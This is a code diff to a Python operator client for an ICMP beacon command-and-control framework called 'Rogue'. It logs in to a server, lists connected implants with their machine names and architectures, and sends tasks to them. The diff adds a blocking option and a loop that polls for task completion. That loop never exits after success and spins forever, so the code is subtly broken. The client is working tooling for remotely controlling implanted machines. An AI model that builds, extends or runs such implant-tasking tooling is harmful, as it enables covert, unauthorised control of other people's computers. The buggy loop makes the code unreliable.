@@ -22,7 +22,8 @@ if __name__ in '__main__':
     opts = argparse.ArgumentParser( description = 'Rogue: minimal ICMP beacon client.' );
     opts.add_argument( '-u', '--username', help = 'Username to use when connecting to midna. ( e.g. username@hostname ) ', required = False, default = 'user@midna.local', type = str );
     opts.add_argument( '-p', '--password', help = 'Password to use when connecting to midna. ( e.g. password ) ', required = False, default = 'password', type = str );
-    opts.add_argument( '-i', '--interact', help = 'GUID of the agent to interact with.', required = False, default = '', type = str );
+    opts.add_argument( '-i', '--interact', help = 'ID of the agent to interact with.', required = False, default = '', type = str );
+    opts.add_argument( '-b', '--block', help = 'Block until the task has been executed.', action = 'store_true', default = False );
     cmds = opts.add_subparsers( help = 'client commands.', dest = 'subcommand', required = True );
     cmds.add_parser( 'hello', help = 'Tasks the agent to send back a hello packet.' );
     cmds.add_parser( 'list', help = 'Prints a list of agents that are connected.' );
@@ -52,16 +53,15 @@ if __name__ in '__main__':
             ## Print the list of clients
             ##
             if Client['software_id'] == 4:
-                logging.success( 'GUID: {} ANSI ID: {} ID: {} Name: {} Arch: {}'.format( Client['guid'], Client['implant_id'], Client['id'], Client['machine_name'], Client['architecture'] ) );
+                ##
+                ## List information about the client
+                ##
+                logging.success( 'GUID: {} ID: {} Name: {} Arch: {}'.format( Client['guid'], Client['implant_id'], Client['machine_name'], Client['architecture'] ) );
 
     ##
     ## "hello"
     ##
     if args.subcommand == 'hello':
-        ##
-        ## Create "hello" task
-        ##
-        Buf = tasking.TaskingRequest( tasking.COMMAND_HELLO, 0, '' );
 
         ##
         ## Get the target
@@ -85,17 +85,37 @@ if __name__ in '__main__':
                     ##
                     logging.success( 'Sending task to the client' );
 
-                    Jsn = {
-                            "code": tasking.COMMAND_HELLO,
-                            "target_id": Client['id'],
-                            "args": { "buffer": "test" }
-                    }
+                    ##
+                    ## Insert Task
+                    ##
+                    Tsk = Web.new_task( {
+                        'code': tasking.COMMAND_HELLO,
+                        'target_id': Client['id'],
+                        'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
+                    } );
 
-                    #Tsk = Web.new_task( Jsn );
+                    ##
+                    ## Print Info
+                    ##
+                    logging.debug( 'Requested task {} to be executed.'.format( str( Tsk['id'] ) ) );
 
-                    #print( Tsk );
-
-                    print( Web.get_tasks() );
+                    ##
+                    ## Abort
+                    ##
+                    if args.block != False:
+                        ##
+                        ## Start riskin
+                        ##
+                        while True:
+                            for Obj in Web.get_tasks():
+                                ##
+                                ## Does it match our dispatched task?
+                                ##
+                                if Tsk['id'] == Obj['id'] and Tsk['target_id'] == Obj['target_id'] and Obj['status'] == 3:
+                                    ##
+                                    ## Success!
+                                    ##
+                                    print( 'task completed successfully.' );
                     break;
         else:
             logging.error( 'please provide an id to interact with.' );
